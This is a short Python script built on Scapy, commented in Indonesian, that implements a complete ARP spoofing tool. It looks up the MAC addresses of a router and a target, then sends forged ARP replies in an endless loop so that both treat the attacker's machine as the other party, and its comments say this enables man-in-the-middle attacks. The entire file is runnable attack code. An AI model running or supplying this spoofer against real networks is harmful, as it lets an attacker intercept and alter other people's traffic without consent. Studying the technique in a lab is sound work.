# Program ini adalah sebuah ARP Spoofing tool yang ditulis menggunakan Python dan menggunakan library Scapy.
import scapy.all as scapy
import sys
import time
# 1. **Import Library**: Program mengimpor modul `scapy.all` sebagai `scapy` untuk digunakan dalam membuat dan mengirimkan paket ARP.

def get_mac_address(ip_address):
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer/arp_layer
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc
    # 2. **Fungsi `get_mac_address`**:
    #    - Fungsi ini digunakan untuk mendapatkan alamat MAC dari suatu alamat IP yang diberikan.
    #      Untuk melakukan hal ini, fungsi membuat paket ARP yang ditujukan ke alamat IP yang diberikan dengan menggunakan alamat MAC broadcast,
    #      kemudian mengirimkan paket tersebut dan menunggu jawaban. Fungsi ini akan mengembalikan alamat MAC yang diterima dari jawaban pertama.


def spoof(router_ip, target_ip, router_mac, target_mac):
    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    scapy.send(packet1)
    scapy.send(packet2)
    # 3. **Fungsi `spoof`**: Fungsi ini digunakan untuk melakukan spoofing ARP antara router dan target.
    #                        Fungsi ini membuat dua paket ARP palsu: satu untuk memalsukan alamat MAC router kepada target,
    #                        dan satu lagi untuk memalsukan alamat MAC target kepada router. 
    #                        Setelah paket-paket tersebut dibuat, mereka dikirim menggunakan Scapy.


target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))
# 4. **Mendapatkan Informasi Penting**: Program mengambil alamat IP router dan target dari argumen baris perintah, kemudian mengambil alamat MAC mereka dengan memanggil fungsi `get_mac_address`.

try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)
         # 5. **Pengulangan Tak Terbatas**: Program akan memasuki loop tak terbatas di mana ia akan terus melakukan spoofing secara berulang antara router dan target dengan interval waktu tertentu (dalam contoh ini, 2 detik).
         #                                  Spoofing dilakukan dengan memanggil fungsi `spoof`.
except KeyboardInterrupt:
    print('Menutup ARP Spoofer.')
    exit(0)
    # 6. **Penanganan Keyboard Interrupt**: Jika pengguna menekan Ctrl+C, program akan menangkap KeyboardInterrupt dan mencetak pesan bahwa ARP Spoofer ditutup sebelum keluar dari program.


# program ini secara terus-menerus akan memalsukan identitas antara router dan target,
#  membuat mereka percaya bahwa program ini adalah router (untuk target) atau target (untuk router).
#  Hal ini bisa dimanfaatkan untuk melakukan serangan man-in-the-middle (MITM) di dalam jaringan yang terhubung.
# ========================================================================================
